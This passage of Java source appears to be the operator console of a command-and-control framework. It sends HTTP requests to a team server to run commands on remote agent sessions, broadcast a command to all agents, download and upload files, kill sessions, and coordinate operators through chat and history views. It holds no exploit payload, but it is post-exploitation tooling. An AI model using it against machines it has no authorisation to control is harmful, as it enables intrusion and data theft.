            for (Map<String, Object> Message : Messages) {
                String From = Message.getOrDefault("From", "?").toString();
                String To   = Message.getOrDefault("To", "all").toString();
                String Ts   = Message.getOrDefault("Timestamp", "").toString();
                if (Ts.length() > 19) Ts = Ts.substring(11, 19);
                boolean Mine = From.equals(OperatorName);
                Logger.Custom(INDENT + "%s[%s] %s%s%s [%s]: %s%s%n", Mine ? AnsiColor.Green : AnsiColor.White, Ts, Mine ? AnsiColor.Green : AnsiColor.Red, From, AnsiColor.Reset, To.equals("all") ? "all" : "→ " + To, Message.getOrDefault("Message", ""), AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void ShowOperators() {
        try {
            Map<String, Object> R = Get("/api/team/operators");
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Ops = (List<Map<String, Object>>) R.getOrDefault("Operators", new ArrayList<>());
            System.out.println(TerminalHelper.Box("OPERATORS (" + Ops.size() + ")"));
            System.out.println();
            Logger.Custom(INDENT + "%s%-18s %-10s %-24s %-20s%s%n", AnsiColor.Red, "USERNAME", "ROLE", "PERMISSIONS", "LAST SEEN", AnsiColor.Reset);
            System.out.println(TerminalHelper.Divider());
            for (Map<String, Object> Op : Ops) {
                OperatorRole R2 = OperatorRole.FromString(Op.getOrDefault("Role", "MEMBER").toString());
                boolean Me = Op.getOrDefault("Username", "").toString().equals(OperatorName);
                Logger.Custom(INDENT + "%s%-18s %-10s %-24s %-20s%s%s%n", AnsiColor.White, Op.getOrDefault("Username", "?"), R2.name(), R2.PermissionString(), Op.getOrDefault("LastSeen", "Never"), Me ? AnsiColor.Green + " ◀ YOU" : "", AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void ShowHistory(int AgentId, int Limit) {
        try {
            Map<String, Object> Body = Map.of("AgentId", AgentId, "Limit", Limit);
            Map<String, Object> R = Post("/api/command/history", Body);
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Hist = (List<Map<String, Object>>) R.getOrDefault("History", new ArrayList<>());
            System.out.println(TerminalHelper.Box("COMMAND HISTORY (last " + Limit + (AgentId > 0 ? " — session-" + AgentId : "") + ")"));
            System.out.println();
            if (Hist.isEmpty()) {
                Logger.Info(INDENT + "no history");
                System.out.println();
                return;
            }
            Logger.Custom(INDENT + "%s%-5s %-12s %-10s %-36s %s%s%n", AnsiColor.Red, "SID", "OPERATOR", "STATUS", "COMMAND", "TIMESTAMP", AnsiColor.Reset);
            System.out.println(TerminalHelper.Divider());
            for (Map<String, Object> H : Hist) {
                boolean Ok = Boolean.parseBoolean(H.getOrDefault("Success", "false").toString());
                String Cmd = TerminalHelper.Truncate(H.getOrDefault("Command", "").toString(), 36);
                Logger.Custom(INDENT + "%s%-5s %-12s %s%-10s%s %-36s %s%s%n", AnsiColor.White, H.getOrDefault("AgentId", "?"), TerminalHelper.Truncate(H.getOrDefault("Operator", "?").toString(), 12), Ok ? AnsiColor.Green : AnsiColor.Red, Ok ? "✔ ok" : "✘ fail", AnsiColor.White, Cmd, H.getOrDefault("Timestamp", ""), AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void ShowSessionHistory(int Limit) {
        try {
            Map<String, Object> R = Post("/api/sessions/history", Map.of("Limit", Limit));
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Sess = (List<Map<String, Object>>) R.getOrDefault("Sessions", new ArrayList<>());
            System.out.println(TerminalHelper.Box("SESSION HISTORY (last " + Limit + ")"));
            System.out.println();
            Sess.forEach(S -> Logger.Custom(INDENT + "%s%s%s%n", AnsiColor.White, S, AnsiColor.Reset));
            System.out.println();
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private static String Args(String[] Parts, int FromIndex) {
        if (FromIndex >= Parts.length) return "";
        StringBuilder Builder = new StringBuilder();
        for (int Index = FromIndex; Index < Parts.length; Index++) {
            if (Index > FromIndex) Builder.append(' ');
            Builder.append(Parts[Index]);
        }
        return Builder.toString();
    }

    private void Exec(int Id, String Cmd) {
        try {
            Map<String, Object> Body = new LinkedHashMap<>();
            Body.put("AgentId", Id);
            Body.put("Command", Cmd);
            Body.put("Operator", OperatorName);
            Map<String, Object> R = Post("/api/command/execute", Body);
            boolean Ok = Boolean.parseBoolean(R.getOrDefault("Success", "false").toString());
            PrintOutput(Ok, R.getOrDefault("Output", "").toString());
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void SimpleExec(String[] Parts, String Cmd) {
        try {
            Exec(ParseInt(Parts[1]), Cmd);
        } catch (NumberFormatException Ex) {
            Logger.Warn("invalid session ID");
        }
    }

    private void DoBroadcast(String Target, String Cmd) {
        try {
            Map<String, Object> Body = new LinkedHashMap<>();
            Body.put("Command", Cmd);
            Body.put("Operator", OperatorName);
            Map<String, Object> R;
            if (Target.equals("all")) {
                R = Post("/api/command/broadcastall", Body);
            } else {
                List<Integer> Ids = new ArrayList<>();
                for (String S : Target.split(","))
                    try {
                        Ids.add(Integer.parseInt(S.trim()));
                    } catch (Exception Ign) {}
                Body.put("AgentIds", Ids);
                R = Post("/api/command/broadcast", Body);
            }
            @SuppressWarnings("unchecked")
            Map<String, Object> Results = (Map<String, Object>) R.getOrDefault("Results", new LinkedHashMap<>());
            Results.forEach((Id, V) -> {
                @SuppressWarnings("unchecked")
                Map<String, Object> Res = (Map<String, Object>) V;
                boolean Ok = Boolean.parseBoolean(Res.getOrDefault("Success", "false").toString());
                Logger.Custom(INDENT + "%s[session-%s] %s%s%s%n", Ok ? AnsiColor.Green : AnsiColor.Red, Id, Ok ? "✔ " : "✘ ", Res.getOrDefault("Output", ""), AnsiColor.Reset);
            });
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void Kill(int Id) {
        try {
            Map<String, Object> R = Post("/api/agents/kill", Map.of("AgentId", Id));
            if (Boolean.parseBoolean(R.getOrDefault("Success", "false").toString())) Logger.Ok("session-" + Id + " terminated");
            else Logger.Error("kill failed: " + R.getOrDefault("Error", "?"));
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void DoDownload(int Id, String Path) {
        try {
            Map<String, Object> R = Post("/api/command/download", Map.of("AgentId", Id, "Path", Path, "Operator", OperatorName));
            PrintOutput(Boolean.parseBoolean(R.getOrDefault("Success", "false").toString()), R.getOrDefault("Output", "").toString());
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void DoUpload(int Id, String Local, String Remote) {
        try {
            Map<String, Object> Body = new LinkedHashMap<>();
            Body.put("AgentId", Id);
            Body.put("LocalPath", Local);
            Body.put("RemotePath", Remote);
            Body.put("Operator", OperatorName);
            Map<String, Object> R = Post("/api/command/upload", Body);
            PrintOutput(Boolean.parseBoolean(R.getOrDefault("Success", "false").toString()), R.getOrDefault("Output", "").toString());
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void SetNote(int Id, String Note) {
        try {
            Map<String, Object> R = Post("/api/agents/note", Map.of("AgentId", Id, "Note", Note));
            if (Boolean.parseBoolean(R.getOrDefault("Success", "false").toString())) Logger.Ok("Note saved for session-" + Id);
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void GetNote(int Id) {
        try {
            Map<String, Object> R = Get("/api/agents");
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Agents = (List<Map<String, Object>>) R.getOrDefault("Agents", new ArrayList<>());
            Agents.stream()
                .filter(A -> ((Number) A.getOrDefault("ID", -1.0)).intValue() == Id)
                .findFirst()
                .ifPresentOrElse(A -> Logger.Custom(INDENT + "Note [%d]: %s%s%s%n", Id, AnsiColor.White, A.getOrDefault("Note", "(none)"), AnsiColor.Reset), () -> Logger.Warn("session not found"));
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void SendChat(String To, String Msg) {
        try {
            Map<String, Object> ChatBody = new LinkedHashMap<>();
            ChatBody.put("From", OperatorName != null ? OperatorName : "operator");
            ChatBody.put("To", To);
            ChatBody.put("Message", Msg);
            Post("/api/team/chat/send", ChatBody);
            Logger.Custom(INDENT + "%s→ %s:%s %s%n", AnsiColor.Green, To, AnsiColor.Reset, Msg);
        } catch (Exception Ex) {
            Logger.Error(Ex.getMessage());
        }
    }

    private void PrintOutput(boolean Ok, String Out) {
        if (Ok) System.out.println(TerminalHelper.OutputBox(Out));
        else Logger.Error(Out);
        System.out.println();
    }

    private Map<String, Object> Post(String Path, Map<String, Object> Body) throws Exception {
        String Payload = Json.toJson(Body != null ? Body : new LinkedHashMap<>());
        HttpRequest.Builder Req = HttpRequest.newBuilder()
            .uri(URI.create("http://" + TsHost + ":" + TsPort + Path))
            .header("Content-Type", "application/json")
            .POST(HttpRequest.BodyPublishers.ofString(Payload));
        if (Token != null) Req.header("Authorization", "Bearer " + Token);
        HttpResponse<String> Resp = Http.send(Req.build(), HttpResponse.BodyHandlers.ofString());
        @SuppressWarnings("unchecked")
        Map<String, Object> R = Json.fromJson(Resp.body(), Map.class);
        return R != null ? R : new LinkedHashMap<>();
    }

    private Map<String, Object> Get(String Path) throws Exception {
        HttpRequest.Builder Req = HttpRequest.newBuilder()
            .uri(URI.create("http://" + TsHost + ":" + TsPort + Path))
            .header("Content-Type", "application/json")
            .GET();
        if (Token != null) Req.header("Authorization", "Bearer " + Token);
        HttpResponse<String> Resp = Http.send(Req.build(), HttpResponse.BodyHandlers.ofString());
        @SuppressWarnings("unchecked")
        Map<String, Object> R = Json.fromJson(Resp.body(), Map.class);
        return R != null ? R : new LinkedHashMap<>();
    }

    private static int ParseInt(String Value) {
        return Integer.parseInt(Value.trim());
    }

    private static int ParseIntSafe(String Value, int Default) {
        try {
            return Integer.parseInt(Value.trim());
        } catch (Exception Ignored) {
            return Default;
        }
    }

    private static final class Logger {

        static void Ok(String Message) {
            System.out.printf("  %s✔ %s%s%n%n", AnsiColor.Green, Message, AnsiColor.Reset);
        }

        static void Warn(String Message) {
            System.out.printf("  %s⚠ %s%s%n", AnsiColor.White, Message, AnsiColor.Reset);
        }

        static void Error(String Message) {
            System.out.printf("  %s✘ %s%s%n", AnsiColor.Red, Message, AnsiColor.Reset);
        }

        static void Info(String Message) {
            System.out.println(Message);
        }

        static void Custom(String Format, Object... Args) {
            System.out.printf(Format, Args);
        }
    }
}
